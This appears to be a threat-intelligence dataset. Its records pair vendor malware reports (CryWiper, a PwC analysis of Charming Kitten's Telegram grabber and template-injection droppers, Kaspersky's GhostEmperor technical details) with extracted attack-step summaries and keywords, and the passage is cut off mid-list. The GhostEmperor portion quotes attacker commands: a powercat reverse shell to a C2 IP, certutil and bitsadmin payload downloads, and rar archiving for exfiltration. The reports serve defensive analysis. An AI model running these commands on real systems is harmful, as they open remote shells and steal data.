Trojan sample on the system ","1. CryWiper malware sample executed on a Windows system, likely started via Task Scheduler. 2. Malware contacts command and control server via HTTP GET request, passing infected computer name as parameter. 3. C&C server returns command ""run"" which triggers destructive behavior. Otherwise malware exits after 4 day delay (incorrectly implemented). 4. Malware stops critical processes like databases, email servers, and Active Directory services using taskkill. 5. Deletes Volume Shadow Copies using vssadmin to prevent file recovery. 6. Disables RDP access by modifying registry key to prevent remote access. 7. Generates pseudo-random data using Mersenne Twister algorithm. 8. Overwrites user files with pseudo-random data, skipping certain file types and directories. 9. Adds .CRY extension to corrupted files. 10. Creates ransom note with typical messaging, Bitcoin wallet, email contact, and fixed victim ID. 11. Does not actually encrypt files, only destroys data irreversibly. Ransom payment cannot recover files. ",valid_37,"['CryWiper', 'malware', 'Sample', 'Windows', 'a task', 'Task Scheduler', 'command', 'HTTP GET request', 'parameter', 'C&C', 'run', 'exits', '4 day', 'data', 'Active Directory', 'taskkill', 'shadow copies', 'vssadmin', 'recovery', 'RDP access', 'registry', 'Generates', 'algorithm', 'user files', 'directories', 'extension', '10', 'Bitcoin wallet', '11']",CryWiper; malware; Sample; Windows; a task; Task Scheduler; command; HTTP GET request; parameter; C&C; run; exits; 4 day; data; Active Directory; taskkill; shadow copies; vssadmin; recovery; RDP access; registry; Generates; algorithm; user files; directories; extension; 10; Bitcoin wallet; 11.
"www.pwc.com /gx/en/issues/cybersecurity/cyber-threat-intelligence/old-cat-new-tricks.html Old cat, new tricks, bad habitsAn analysis of Charming Kitten’s new tools and OPSEC errorsCopy link Link copied to clipboardBy Krystle Reid Executive summaryYellow Garuda (similar to Charming Kitten, PHOSPHORUS, UNC788) is a threat actor likely to have been active since at least 2012. It is possibly one of the most active and persistent Iran-based threat actors over the last decade and is known primarily for spoofing log-in pages of legitimate webmail services to collect credentials from its targets. The threat actor also has a history of operational security (OPSEC) errors resulting in disclosure of its tools, techniques and procedures (TTPs), including the addition of Android malware to its expanding toolset.OPSEC mistakes associated with Yellow Garuda operations in late 2021 resulted in the discovery of new tool used to enumerate data from targeted Telegram accounts. We also identified an alias tied to early Iran-based operations and a surveillance report likely written by a Yellow Garuda operator. Additionally, PwC analysts have observed the threat actor’s use of macro-enabled template files as recently as March 2022, a new TTP not previously associated with Yellow Garuda. Telegram ‘grabber’ tool1/14Through our regular scanning for Yellow Garuda infrastructure, PwC analysts identified an open directory located at 138.201.145[.]183 containing several compressed archives associated with late 2021 Yellow Garuda activity.Each of the RAR archives contained a copy of a tool named NewTelegram.LocalGrabber.Sqlite.UI.Win.exe, together with the tool’s component parts, and exfiltrated victim data. In total there were seven sets of victim data on the server, six of which were outputs of the Telegram ‘grabber’ tool, and one of which was almost certainly the result of data exfiltrated by mobile malware. Although it is unclear what malware was used, we note that the type of data captured is in line with the capabilities of PINEFLOWER, an Android malware previously attributed to Yellow Garuda1.These archives had filenames referencing Solar Hijri calendar dates indicating that the activity took place between 7th September and 11th October 2021, when converted to the Gregorian calendar. The activity suggests domestic targeting as all victim mobile numbers contained the Iranian country code and Farsi was the main language seen in victim databases (as part of Telegram group names or in exfiltrated messages). From the data exfiltrated, it was also apparent that some of victims were associates of each other, where two pairs of victims were contacts of another victim on Telegram. We also observed that two of the victims likely had links to the Iranian music industry.Figure 1 - Contents of 138.201.145[.]1832/14The Telegram grabber tool is written in C++ and uses the open source Telegram Database Library (TDLib), a cross-platform Telegram client typically used to create custom apps for the platform2. It has been designed to exfiltrate information from a victim’s Telegram account. This includes messages and associated media, group memberships and contact data.SHA-256 NewTelegram.LocalGrabber.Sqlite.UI.Win.exe Win32 EXE 5,423,104 bytes 2062-01-30 02:30:48In order to access the victim’s account, the threat actor needs to enter a login code which is issued by Telegram as part of its authentication process. The code is sent either to the victim’s Telegram account, or via SMS to the victim’s phone3. This means that the threat actor needs to have access to a victim’s active Telegram session, either via a phone or desktop, or otherwise be able to access their SMS messages, for example via mobile malware. As can be seen in Figure 2, the victim’s phone number is required upon opening the tool in order to send the authentication code.Figure 2 – GUI to enter victim’s phone numberIf the victim has enabled two-step verification, an additional password is needed. Where this is unknown, it can be reset using a recovery email if one has been previously setup. The tool has options to view the password hint and send an access code via the victim’s recovery email address, which the threat actor would need to access in order to proceed. The existence of this option indicates that the threat actor, at least in some cases, is likely to have access to the victim’s email account. This aligns with Yellow Garuda’s known tactics, which include extensive credential harvesting via dedicated phishing sites.Once authenticated, the operator is presented with multiple options to choose the type of data to download. This includes the ability to select a date range for the download of the different types of Telegram chat messages. For groups, the tool attempts to grab details on the participants as well as whether or not the victim is an administrator. The tool is also able to download data relating to the victim’s profile and their contacts, including their names, phone numbers, usernames and profile pictures.3/14Figure 3 – Metadata accessed for each contactThe exfiltrated data is stored within a SQLite database and also in JSON format. For attachments sent or received through chats, there are options to choose specific file formats to download. These pertain to common video, audio, document, binary and compressed file extensions. In addition to being able to exfiltrate data, the threat actor also has the ability to delete messages from the victim’s account.We found 15 additional samples of the tool on an online multi-antivirus scanner which share the same filename (NewTelegram.LocalGrabber.Sqlite.UI.Win.exe) and TypeLib ID (7bb2c20c-740e-498b-8dd6- 9c2ff8ad9572) as the sample we analysed. The TypeLib ID is a unique GUID created by Visual Studio when a new project is created4, thus indicating that all of the samples originated from the same project. The additional samples were all uploaded within a 31 day window between January and February 2021 and contained similar functionality to the one we analysed. The main difference was the presence of a web request function that appeared to be used in a testing capacity. Given the clustered times of submission and the presence of the web request test method, we assess it is likely these samples were submitted by the threat actor itself in a testing capacity. Insights into Yellow Garuda’s operationsThe following Microsoft Word document was found in the directory corresponding to one of the victims whose data was highly likely exfiltrated via mobile malware and not through the Telegram ‘grabber’ tool.4/14Its filename translates to ‘01Report’ and its contents detail the status of the surveillance on that victim.Filename Last modified user ll_invisible_ll Creation date 2021-10-11 06:48:00 Last modifed date 2021-10-12 12:54:00 File size13,736 bytesFigure 4 – Threat actor report (left) and translation from Farsi to English (right)The report gives us insight into the threat actor’s specific data collection objectives. It references the surveillance of audio and video conversations of the victim’s phone and confirms the victim’s name, national identity number, mobile number and phone model. It indicates the surveillance was completed on 11th October 2021 and is being sent for review by the ‘relevant expert’ on the orders of the manager of ‘2000’ and ‘2300’, numbers which could represent individual operators or departments within Yellow Garuda’s operations. The report ends with a warning that if the surveillance is detected, it will not be possible to re-access the phone.These numbers align with additional observations from the output log files of the Telegram ‘grabber’ tool which contained local file paths likely belonging to the threat actor. An example is as follows:5/14Figure 5 – Example of file path found in output log files. The date converts to 22nd September 2021 in the Gregorian calendarWe observed values of 1500, 2700 and 3500 being used as part of the local directory structure. This indicates that at least three operators or teams may have contributed to the Telegram ‘grabber’ activity observed and a further two separate operators or teams worked on the victim referenced in the report.A previously leaked organisational chart associated with Iran’s Islamic Revolutionary Guard Corps (IRGC) shows individual departments with similar numerical referencing (Figure 6)5. From the English translation in Table 1, we can see that several of the observed values are present, overlapping with departments related to cyber, security and counterintelligence. Although we are unable to independently verify the validity of this chart, the overlap in naming convention, and our understanding that Yellow Garuda is likely associated with the IRGC6, aligns with our assessment that these are operator/team names.The author name of the threat actor report, “ll_invisible_ll” is fairly unique and gives us insight into a potential individual operator. This alias was also in use between 2010 and 2016 on the Ashiyane forum, a now defunct Iranian hacking forum originally started by the Ashiyane Digital Security Team. The Ashiyane Digital Security Team has previously been linked to IRGC activity7 and several of its members appeared in a US Department of Justice (DOJ) indictment for distributed denial of service (DDoS) attacks against organisations in the US financial sector and other US-based companies between 2011 and 20138.6/14Figure 6 – Diagram purportedly showing IRGC-related departments and leads (Farsi language) [9]Name Head of the Intelligence Unit of the IRGC, Hossein Taeb The Head of Department, General Yar Ali Sabzi Deputy of Readiness and Support Deputy of HR and Recruitment Deputy of Plan, Program and Budget, General Gholipour Deputy of Military IntelligenceNumber 5007/14Deputy of Psychological Operations, Haj Abdullah Mushfeq Special cases Deputy of Equipping, General Sadeghian Deputy of Information Protection, Izadi Deputy of Inspector, General Karimi Deputy of Information Collection Thematic Deputy of Counterintelligence, General Taha Deputy of Arrest and Surveillance Operation, Detention Center, General Qajavand Legal Deputy, Dr. Mahdavi Deputy of Civil Engineering (Structure and Building) Representative of the Supreme Leader, Haj Qasimi and Mr. Elahi Deputy of Cyber, Hamid Naeem Deputy of Security (Counter-Terrorism and Fight against Armed Groups), General Nouhi Deputy of Crimes Centre of Documents600 N/ATable 1 – English translation of Figure 6 showing IRGC-related departments and leads; numbers overlapping with those observed in our analysis have been highlighted in bold Macro-enabled Word document templatesBetween January and March 2022, we observed Yellow Garuda using Microsoft Word document droppers which use remote template injection to obtain and execute a malicious macro. This is the first time we have observed the threat actor deploying macros or using remote template injection as part of its attack sequence.SHA-256 related to Turkey, US shipping ports and Iran’s relationship to the Taliban and as such, we assess they were likely used to target a variety of unrelated entities. Many of these lures, used material sourced from legitimate English-language websites, including news and media sites. It is not unusual for threat actors to make use of current affairs as a means to catch the attention of potential victims and the themes are not necessarily indicative of specific targeting.8/14Figure 7 – Example of lure contentThe initial Microsoft Word document (DOCX) is hosted on a third party service such as Dropbox or Amazon Web Services (AWS). Yellow Garuda is known to extensively employ social engineering as part of its attacks, therefore it is highly likely phishing was used to coerce a potential victim to download and open the document.Once opened, a form of remote template injection takes place where the document reaches out to a URL to download a file with a DOTM extension (a macro-enabled template file). The URL is specified within the relationship component word/_rels/settings.xml.rels of the initial document as indicated by the ‘Target’ value in Figure 8. The documents we analysed reached out to files hosted on either Microsoft OneDrive or on dedicated threat actor-controlled infrastructure, as can be seen below.Figure 8 – URL visible in word/_rels/settings.xml.relsWe were able to access several examples of this second stage macro-enabled template file. These differed in functionality and form, however they all maintained persistence by replacing the victim’s default Microsoft Word template, meaning that the malicious template (and macro) will open whenever Microsoft Word is opened by the victim.SHA-256 found in open source on a GitHub repository12. In other cases13, the template files were password protected meaning that the victim is required to specify the password in order for the attack sequence to proceed. This would need to be passed over to the victim via a phishing email or some other form of social engineering. The template files also contained RC4-encrypted strings (both within the macro and lure document) for which the decryption key needed to be obtained as the response to a HTTP GET request to an Amazon S3 bucket. These steps were likely designed to thwart analysis attempts if the password cannot be obtained to open the document, or the infrastructure hosting the decryption key is no longer active.Files dropped by the macros shared similar filenames to recent Yellow Garuda activity observed by Check Point14. The PowerShell backdoor known as CharmPower was observed to read data from a file called ni.txt, located in %AppData%, whose contents are sent to the command and control server along with basic information about the victim’s machine. This aligns with our observations that ni.txt is used to house a hardcoded identifier and could indicate that a version of CharmPower is deployed at a later stage of the attack sequence. ConclusionOver the past year, we have seen Yellow Garuda continue to add tools to its arsenal. In its use of macro- enabled template files, we can see that the threat actor has made efforts to stage various parts of the infection chain remotely, disrupting analysis efforts where these are not accessible. The threat actor has also continued to make OPSEC mistakes exposing its tools and targeting through open servers. The Telegram ‘grabber’ tool we observed appears to be a tool that the threat actor has had access to since at least January 2021, and used against domestic targets to obtain specific access to Telegram messages and contacts alongside mobile malware.The threat actor’s operational report has given us further insight into its analysis process, indicating that there is an internal structure to its operations denoted by numerical call signs. It also highlights the alias of an individual which has previously been linked to Iran-based activity over several years.MITRE ATT&CKMore detailed information on each of the techniques used in this blog, along with mitigations, can be found on the following MITRE pages:Valid Accounts - url Authentication Interception - url Files or Information - url Information Discovery - url Network Configuration Discovery - url Staged - url Over Web Service - url Infrastructure: Web Services - url Infrastructure: Domains - url Spearphishing Link - url of CompromiseTelegram ‘grabber’ tool:TypeIndicator NewTelegram.LocalGrabber.Sqlite.UI.Win.exe 138.201.145[.]183Macro-enabled template activity:MD5 official-updates[.]info office-updates[.]info 51.38.87[.]253Type IPv4 address12/14hxxp://official-updates[.]info/office/Default.dotm hxxps://dl[.]dropboxusercontent[.]com/s/psmt483ybusajvy/Turkey.docx?dl=0 hxxps://u1ndk6f4nf[.]execute-api[.]us-east- 1[.]amazonaws[.]com/page/EdPEtAGapngkNtLLFCee hxxps://u1ndk6f4nf[.]execute-api[.]us-east- 1[.]amazonaws[.]com/page/zhUezQeFqaDRmxWaHfVz hxxps://s3[.]amazonaws[.]com/2v63r9egi46/mvhg5dhdbsolshpq hxxps://s3[.]amazonaws[.]com/2v63r9egi46/hgn8fdsf512fsc5 hxxps://drive[.]google[.]com/uc? export=download&id=13_PT71n8Ujl2lSTcQcyFJ4TNetI- wvDf&dID=1645099370036&linkName=Download%20File hxxp://office-updates[.]info/2022/Details.dotm hxxp://office-updates[.]info/static/admin/storage/Arabic.dotm hxxp://office-updates[.]info/static/admin/storage/Details.dotm URL[1] ‘UNC788: IRAN’S DECADE OF CREDENTIAL HARVESTING AND SURVEILLANCE OPERATIONS’, VB2021 localhost, url (October 2021)[2] Telegram, ‘Telegram Database Library’, url Telegram, ‘FAQ’, url#login-and-sms[4] ‘Using .NET GUIDs to help hunt for malware’, Virus Bulletin, url guids-help-hunt-malware/ (25th June 2015)[5] ‘BLACK BOX|هﺎﯿﺳ ﻪﺒﻌﺟ’, Telegram, url (26th February 2019)[6] ‘BadBlood: TA453 Targets US and Israeli Medical Research Personnel in Credential Phishing Campaigns’, Proofpoint, url (30th March 2021)[7] ‘Decision 2011/235/CFSP’, European Union, url url (11th January 2022)14/14 ","1. The attack starts with phishing emails containing weaponized Microsoft Word documents that have links to download a malicious macro-enabled template file. 2. When the document is opened, it uses remote template injection to retrieve the DOTM file containing macros. 3. The macro executes and maintains persistence by replacing the victim's normal Word template file. 4. The malicious macro reaches out to download next-stage payloads from C2 servers. 5. These payloads likely deploy malware like CharmPower to achieve remote access, exfiltrate data, and carry out other objectives. ",valid_43,"['The attack', 'Microsoft Word document', 'links', 'a malicious macro', 'macro-', '-enabled template file', 'the document', 'use', 'remote template injection', 'DOTM', 'macros', 'EXE', 'persistence', 'the victim', 'C2', 'malware', 'CharmPower', 'access', 'exfiltrate data']",The attack; Microsoft Word document; links; a malicious macro; macro-; -enabled template file; the document; use; remote template injection; DOTM; macros; EXE; persistence; the victim; C2; malware; CharmPower; access; exfiltrate data.
"GhostEmperor’s infection chain and post- exploitation toolset: technical detailsLearn more: kaspersky.comThis document provides a more thorough and in-depth technical analysis of the various stages in GhostEmperor’s infection chain, as outlined in the blog post. In addition, we provide a section with a description of the post-exploitation tools leveraged by the actor, demonstrating how they were used with actual command lines issued by the operators during the attacks.Stage 1: PowerShell DropperThe installation of the rootkit and the malicious service is started by a BAT file. The BAT file is usually created under the C:\Windows\debug or C:\Windows\debug\wia directory, along with a PowerShell script. The script is an installer encrypted using AES, and the BAT file runs it through the following set of command lines:PowerShell -ex Bypass C:\windows\debug\chrome.ps1 popmart123 >> C:\windows\debug\di.txt ipconfig >> C:\windows\debug\di.txtError messages from the PowerShell script along with the victim’s network information are logged in a text file under the same directory. The BAT file also provides a decryption key as an argument for the PowerShell script, allowing the attackers to hinder analysis because without the decryption key, it is not possible to view the later stages of the infection. We managed to identify a total of eight keys used by the attackers:• systeminfo • qpalzmLLLThe decrypted script contains three encoded buffers. The first one is decoded and written to a DLL file, and a service is created to run it. The service is put in a group called ‘MsGroup’ or ‘AuthSvcGroup’. We identified three such DLL names, with a matching service name for each one:Service Name C:\Windows\System32\msmp4dec.dll C:\ProgramData\Microsoft\Network\Connections\msdecode.dll C:\Windows\System32\AuthSvc.dll2The remaining two buffers in the script are AES encrypted. They are decoded by the PowerShell script and written to two registry keys that are later decrypted and loaded by the DLL:Encoded buffers in the decrypted PowerShell installer scriptWe found four registry key names that were created by the different PowerShell installers and contained encrypted buffers:• HKLM\Software\Microsoft\hiaudio • HKLM\Software\Microsoft\midihelp • HKLM\Software\Microsoft\data • HKLM\Software\Microsoft\updateIn some cases, we also observed an uninstaller PowerShell script called uninstall.ps1 that is capable of self-killing and deleting all the artefacts previously created by the installer script. The uninstaller also requires a decryption key to run.Decrypted uninstaller script removing registry keys3Stage 2: Service LoaderWe identified two versions of the DLL service: one written in .NET and another in C++. The latter appeared both in an obfuscated and non-obfuscated form NET versionThe .NET variant is the most recent one we discovered, as it appears to have emerged only in March 2021. The internal name of this variant is SvchostSharp.dll, and we believe the compilation timestamp that suggests it was created in 2017 is fake. The purpose of this service is to decrypt the contents of the registry keys created by the previous stage and load the code stored in them:Reading and decryption of code that resides in a registry key, as done by the .NET variantThe decryption key, however, is based on the GUID of the infected system. This means that the infection chain was tailored for this specific system, and it will not be possible to run the malware or retrieve the next stages in a different environment without knowing the decryption key beforehand.4Generation of a decryption key from the system’s GUIDC++ VersionThe C++ version has a similar purpose as the .NET variant – decrypt AES 256 encrypted data from a formerly written registry key and in turn execute it as position-independent code. This is done in order to stage the next component in the infection chain that serves as the malware’s main user mode component.In contrast to the .NET version, the C++ variant does not mandate that the encryption key used to obtain the next stage is based on the system’s GUID. Instead, it looks for an internal configuration section that starts with the keyword ‘Microsoft’ and parses it to locate a hardcoded key. It is evident in the code that only if this hardcoded key is not provided, the malware turns to use the target’s computer name as the key.Usage of a hardcoded AES key or a fallback key derived from the computer’s name, as evident in the C++ variant5Stage 3: In-Memory ImplantThe service loader aids the execution of a user mode payload in the memory of an svchost.exe process. This serves several purposes. Its main objective is to facilitate a communication channel with a C2 server and act as a client capable of retrieving and staging a payload for further execution. Written in C++, the client can be formed as an instance of one of multiple classes, each presenting a different feature or set of traits that constitute the nature of the communication channel. For example, the client is capable of operating over either HTTP or TLS protocols, supporting various authentication mechanisms like basic access authentication or Microsoft’s Negotiate scheme.The key capability of the client, though, is to mask traffic based on logic constituted by a Malleable C2 profile embedded within its configuration. Such profiles are a set of statements written in a custom language that is originally intended for consumption by servers and clients of the Cobalt Strike framework. Their purpose is to shape the exchanged requests and responses between the Cobalt Strike Beacon client and its server so that they appear as benign traffic and blend with the bulk of packets in the network, or otherwise appear as specific malware, in the case of a red team engagement or pen- testing scenario.In the case of the user mode clients described here, a subset of the Cobalt Strike profile syntax that allows the creation of a specially crafted set of HTTP packets is supported. This makes it possible to parse a profile that resides within the HKLM\ Software\Microsoft\midihelp registry key, formerly written there by the initial PowerShell dropper, using it in turn to mask the packets issued to and from the C2 as Amazon browsing traffic. This profile is publicly available on GitHub, and the malware supports1 the following keywords and statements that allow its interpretation and processing:• set uri, set useragent: specifies the URI and User-Agent fields used as part of an HTTP transaction between the clientand server.• http-get, http-post: types of HTTP transactions that can be customized. In other words, it is possible to shape thestructure of HTTP GET and POST requests and responses in this malware.• client, server: keywords that specify which side of the transaction to profile. For example, under a given http-post transaction it is possible to profile both packets sent from the client and those sent in response from the server. This indicates that such a profile can be consumed by both a client and a server component of the malware.• base64, prepend, append: directive keywords that instruct how to form a data field passed in a transaction. As anexample, for HTTP requests, a given string will be used as data that can then be encoded with Base64, prepended and appended with other strings as the arguments of the corresponding ‘prepend’ and ‘append’ keywords define. The resulting string can be then placed as either a header or a URI parameter.• metadata, query, cookie: strings that can be shaped with the above directives. • parameter, header: for each transaction, these keywords specify where to store their arguments – URI parameters orHTTP headers.As is evident from the C2 profile syntax keywords specified above, the malware may process server mode configuration, thus possibly operating as one under a given configuration. This can be reinforced with additional communication logic found in the code that suggests the operators can configure the malware to run as a server. For example, one of the classes that handles communication over the TLS protocol contains a function that calls the AcceptSecurityContext API typically used on the server end of a TLS session. Additionally, the same class contains a function that allows the issuing of a self- signed certificate with the CertCreateSelfSignCertificate API, using the common name and organization as DigiCert.1 See full documentation on the syntax used by Cobalt Strike for Malleable C2 profiles: url used to create a self-signed certificateAnother interesting attribute of the communication is that data passed in the body of HTTP POST requests is embedded within one of three fake file formats, RIFF, JPEG or PNG, causing the packets to appear as images or audio files sent to the server. The format is chosen at random when building the packet, and its body is later appended to it. Due to the fact that we could not obtain a full communication flow with the server, we can only attest to some of the fields in the structure appended to these formats, as outlined below:Field Size 16 bytes4 bytes8 bytes 2 bytes4 bytes Random data inserted to the packet after it is encoded with the key in the next field Key used to encode the whole packet using a simple XOR algorithmUnknown Flags used to indicate if compression is applied on the payload in the packet. The used compression algorithm found in the code is LZO (Lempel-Ziv-Oberhumer) Unknown CRC32 checksum of the encrypted payload Total length of the transmitted packet Length of the encrypted data Length of the cleartext data (before encryption) AES 256 encrypted payload data, the key is hardcodedOffset 0x327Code used to generate a fake JPEG header and the resulting packetIt should be noted that other than the client logic, there is a lot of code at this stage that is intended to provide the malware with stealth or support the client’s operation. For the former, this component decrypts and loads an embedded rootkit driver that is intended to hide malicious artefacts, as will be described in later sections of the report. For the latter, the malware initiates a thread to detect if the system runs through a proxy, its type and address using various means, namely by issuing a call to the InternetGetProxyInfo API from the jsproxy.dll library which retrieves the address of a proxy used while accessing a given URL. The URL specified for this resolution in the malware is hxxp://update.microsoft[.]com.In addition, the malware contains functionality to manually load a PE image and invoke execution from its entry point. Though we could not obtain an actual payload from the C2 server, we assess that this functionality is used later on to stage an additional payload for execution, as described in the next section.8Stage 4: Remote Control PayloadUnfortunately, we were unable to obtain a full infection chain that would allow us to observe exactly how the payload is obtained by the former stage and directly invoked in memory. Having said that, the logs from our telemetry have shown that in multiple cases additional code was loaded into the memory address space of the svchost.exe process running the client code sometime after the initial infection. It was evident that the secondary in-memory loaded code was related to the client component, as both shared multiple proprietary C++ classes and the exact same obfuscation techniques, described in a later section of the report.Additionally, in several cases we also managed to find the same secondary component in the form of a file on disk. This file is a DLL with some unusual traits, namely, its section table is stripped of names and it exports two functions: one has only an ordinal #1 and the other carries the atypical export name ‘__acrt_iob_func’. Moreover, the same file appeared using a similar naming convention across three targets as summarized in the table below.MD5 memory_50348796.dllmemory_235862828.dll memory_1784500.dllTarget’s Country 13/01/2021 5:04:32 01/08/2020 11:07:1310/03/2021 5:05:16 03/08/2020 2:09:50This component is built as a set of C++ classes that can be instantiated and used by another piece of code during run time. While we were unable to see the code that uses this DLL and invokes the logic within the classes, we were able to analyze several of them and understand their traits and behavior as standalone objects. The following is an outline of some of the key functionalities provided by the DLL through these classes.Payload Injection and Console ControlA few of the classes we observed serve the primary purpose of injecting a payload to other processes on the machine. The target process can be an existing one, in which case it is winlogon.exe, or a newly created process in suspended state. In the latter case, the chosen image for the created process needs to be passed by the code invoking the injection, which we did not obtain. Such code will instantiate the C++ class conducting the injection and invoke the corresponding injection function by passing the path to the image of the created process as an argument.The injection method is fairly straightforward and relies on creating a shared memory buffer between the source and target processes. The buffer is mapped using the NtCreateSection and NtMapViewOfSection APIs, allowing code and data to then be copied into it in the source process and having the same information reflected in the target process. In the case of winlogon.exe, since it is a Windows system process, the injecting code patches a flag in an OS version dependent offset within a structure resolved by the KernelBaseGetGlobalData function, as demonstrated here.9The execution of a function within the remotely written buffer depends on the type of injected process. For winlogon.exe the injected payload will be initiated using the CreateRemoteThread API and for a newly created process the entry point of its executable image will be patched to conduct a jump to the payload, which will occur as soon as the process is resumed from its suspended state.Each injected code is passed along with a pipe name that is then used to establish a duplex IPC communication channel to the injecting component. The latter has the capacity to issue commands or instructions to the injected payload and receive the outputs of their execution. The pipe’s name scheme is \\.\pipe\CDP_CALLBACK_%d, where %d is replaced by a different numeric value for each injected payload.The architecture used by the attackers to stage shellcode buffers in the winlogon.exe process in order to handle various remote control featuresThe injected payload is a position-independent code that serves a couple of purposes, the first of which is to create a console in the remote process and facilitate a channel to interact with it via the previously created named pipe. This is achieved through the following sequence of actions:• Creation of a new console within the injected process using the AllocConsole API and adjusting its window resolution to120 x 200.• Getting handles to the console’s input and output streams using the GetStdHandle API. • Connecting to the named pipe which has its name passed along with the executing shellcode. • Checking if there is data on the pipe using the PeekNamedPipe API and if so retrieving it to a buffer. • The numeric value of the first byte in the obtained data determines the message’s purpose:••If it's a 1, it means the client in the injecting process is requesting a line of the console’s output. This is retrieved by using the console’s output handle and iterating on its window output data along the Y axis (while X is set to 0). For each iterated coordinate a single output character is read at a time using the ReadConsoleOutputCharacterW API. The generated output buffer is then prepended with a data structure of type CONSOLE_SCREEN_BUFFER_INFO to convey the console’s window dimension. If it’s a 2, the message is intended to pass input to the console and the first byte will be followed by the input buffer that is passed to the WriteConsoleInputW API.10Remote Desktop ControlAlternatively, the payload can be used to reflectively load a PE image that is hardcoded within the binary of the injecting DLL and used to control the desktop in the target machine. Such control is achieved by passing keyboard and mouse event inputs over the named pipe to the remotely loaded DLL and potentially retrieving screenshots as outputs with a refresh rate of one second.The messages passed on the named pipe contain keystrokes and mouse cursor position data along with action codes that determine the nature of the passed input. The inputs are then used as arguments for the SendInput or SetCursorPos API functions that pass them to the desktop associated with the thread running the injected payload. The action codes that describe the purpose of the input are split to major and minor codes with the following designations:Description Enable taking of screenshots as output Disable taking of screenshots Undetermined Set the passed cursor position on the screen Set cursor position and pass one of the mouse events – MOUSEEVENTF_ LEFTDOWN, MOUSEEVENTF_LEFTUP, MOUSEEVENTF_RIGHTDOWN and MOUSEEVENTF_RIGHTUP Set cursor position and pass left mouse button double click Set cursor position and pass right mouse button double click Set cursor position and pass mouse wheel event Pass keyboard inputs Initiate a thread to pass a press on special keystrokes (Shift, Control, Menu and Left Windows Key) Terminate the special keystroke thread (i.e., the former press is released) 513,514,516,517515 811Execution of Arbitrary .NET Assemblies and Powershell CommandsAnother capability exposed by a class in the payload DLL is the loading and execution of .NET assemblies during run time. As formerly described, the payload DLL runs in the context of svchost.exe, which is an unmanaged process. In order to support the load of a .NET binary, the code ought to load the .NET CLR runtime, initialize and start it. Then it is possible to use the AppDomain interface provided by it in order to load an assembly, resolve its entry point and invoke it. These stages were observed in the malware’s code and are very close to the flow described here (see ‘Instantiating the CLR’ section).When using the class that provides this capability the user can either pass a struct containing a custom assembly as an argument or load an embedded assembly that serves to execute PowerShell commands. The latter is decoded during run time and uses the .NET Pipeline class that is capable of executing enqueued PowerShell scripts. As can be seen in the code excerpt of this assembly below, an attacker-provided script is passed as an argument to a function named ‘Exec’ which then inserts it into the pipeline object and executes it, returning the result as an output NET code that can be invoked in order to support execution of PowerShell commands as part of the malware’s payload12Filesystem ControlFinally, the payload DLL contains a class that provides the attackers with capability to retrieve information and conduct actions on the target’s file system. As in the cases of the aforementioned classes, one of the functions invoked from the object instantiated from the class can retrieve a code and a corresponding argument and dispatch it to execute a particular file system action on the compromised host. The following is a summary of those codes and their functionality:Description Undetermined Provides a listing of all available drives in the system, their size and free space. Retrieves file attributes as provided by the GetFileAttributesW API function for a given file. Searches for a file with a given name within a specified directory. If a file is found, its full name, attributes, size and timestamps of creation, last access and last write are provided. Moves a file or directory with its contents from a given source to a destination path using the MoveFileW API function. Looks for a file or directory recursively from a given path and, if found, deletes it. Creates a new directory with a given path using the CreateDirectoryW API. Provides file size and timestamps retrieved with the GetFileTime API for a given file’s path. Searches for a file recursively from a given path and provides its creation time, last access time and last write time. Write data to a given offset within a file. Copies a file (using the CopyFileW API) or directory (using the SHFileOperationW API) from one path to another. Executes a given file using the CreateProcessW API. Attempts to retrieve a handle to a security token of another process given its PID and then uses the ImpersonateLoggedOnUser to impersonate the security context of that token’s owner. This may be used to facilitate the execution of other operations that require privileges of a specific user.Code 2,12,13,14 1913Post-exploitation toolset & command detailsIn this section we describe in detail all the tools used by the attackers. We also document the command lines used during the campaign, where we were able to identify them.The leveraged tools were used primarily to steal information from the infected system or spread further in the network. Most of them are legitimate or open-source tools, while some are custom made or not so well known. Below are some of the main tools we identified:• NBTscan: A command line tool to scan a network for NetBIOS information, allowing the attackers to view loggedin users or IP addresses of other machines in the network. The NBTscan executable often appeared under the names ‘nbt.exe’ or ‘nb8.exe’.• PsExec: A command line tool that is part of the Sysinternals suite, allowing the attackers to execute processes onremote systems.• PsList: A command line tool that displays running processes, and is part of the Sysinternals suite. • ProcDump: A command line tool that is part of the Sysinternals suite, used to dump process memory. The attackersused this tool to dump the memory of the LSASS.exe process and steal passwords.• WinRAR: The attackers exfiltrated sensitive files from the infected system, such as JPG images or Word documents andused the RAR.exe tool in order to compress them before uploading the data to the C2 server. To make sure the files are recent, the attackers provided a command line argument that checked if the files were created after a certain date.rar.exe a -r -v200m -ta20201101000000 -n*.doc -n*.docx -n*.xlsx -n*.pdf -n*.txt -n*.jpg -n*.zip ""C:\Windows\debug\ log.rar""Similarly, this utility was used to archive and exfiltrate mailbox contents retrieved to a .pst file via the PowerShell New- MailboxExportRequest cmdlet. A password protected archive with these contents was generated with the command specified below.rar.exe a -r -n*.pst ""$windir\debug\log.rar"" -hpBaigong -y• Certutil, BITSAdmin: Instead of relying on more common methods, the Certutil and BITSAdmin tools are used todownload additional malicious scripts from the C2 servers to evade detection.certutil.exe -urlcache -split -f hxxp://27.102.113[.]240/debug.txt C:\Windows\pla\debug.bat14An interesting thing we noticed is that in one case the BITSAdmin tool downloaded an archive containing a PowerShell installer script from a legitimate website. The website belonged to a government entity from a country in South East Asia, which might have been compromised by GhostEmperor prior to this attack, as it hosted one of their malicious files.bitsadmin /transfer myDownLoadJob /download /priority normal ""hxxp://[redacted]/1.zip"" ""C:\Windows\debug\wia\1.zip"" expand 1.zip sss.ps1• Cscript: The cscript.exe utility executed Visual Basic scripts dropped by the attackers such as ListDomain.vbs, a VB script that dates back to 2012 and collects information about the domain or the workgroup of the infected machine.ListDomain VB script• Schtasks: Instead of running BAT files directly, the attackers scheduled a task (often called ‘test’ or ‘test3’), ran itimmediately with schtasks.exe and then deleted it.schtasks /create /tn ""test3"" /tr C:\Windows\debug\wia\h.bat /sc once /st 23:32:00 /ru ""system"" schtasks /run /tn ""test3"" schtasks /delete /tn ""test3"" /f• Powercat: Powercat is an open-source tool written in PowerShell, and is meant to be an equivalent of the knownnetworking utility NetCat. GhostEmperor’s operators connected to the C2 servers using this tool.powershell IEX (New-Object System.Net.Webclient).DownloadString('url powercat/master/powercat.ps1');powercat -c 27.102.113[.]57 -p 443 -e cmd15• Ladon: Ladon is an open-source tool that assists in lateral movement across a network, as it scans for open ports anddetects devices that are exposed to certain vulnerabilities.• Mimikat_ssp: Mimikat_ssp is an open-source custom tool based on the well-known Mimikatz application, with the aimof avoiding detection by antivirus solutions.• Get-PassHashes.ps1: 